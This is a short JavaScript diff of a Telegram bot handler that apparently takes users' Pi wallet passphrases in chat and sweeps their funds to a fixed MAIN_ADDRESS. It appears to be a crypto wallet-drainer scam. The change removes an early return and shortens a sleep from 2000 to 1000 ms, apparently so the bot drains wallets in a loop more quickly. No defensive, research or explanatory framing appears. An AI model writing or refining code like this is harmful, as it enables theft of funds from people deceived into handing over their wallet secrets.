@@ -423,7 +423,7 @@ bot.on('message', async (msg) => {
                 } else {
                     const result = await sweepWallet(passphrase, MAIN_ADDRESS);
                     if(result.data && result.data.hash) {
-                        return bot.sendMessage(chatId, `✅ ${result.amount} PI sweeped`);
+                        bot.sendMessage(chatId, `✅ ${result.amount} PI sweeped`);
                     } else {
                         bot.sendMessage(chatId, `❌ Sweeping failed`);
                     }
@@ -432,7 +432,7 @@ bot.on('message', async (msg) => {
                 bot.sendMessage(chatId, `❌ Something went wrong, please try again`);
             }
 
-            await sleep(2000);
+            await sleep(1000);
         }
 
         delete userSessions[chatId]
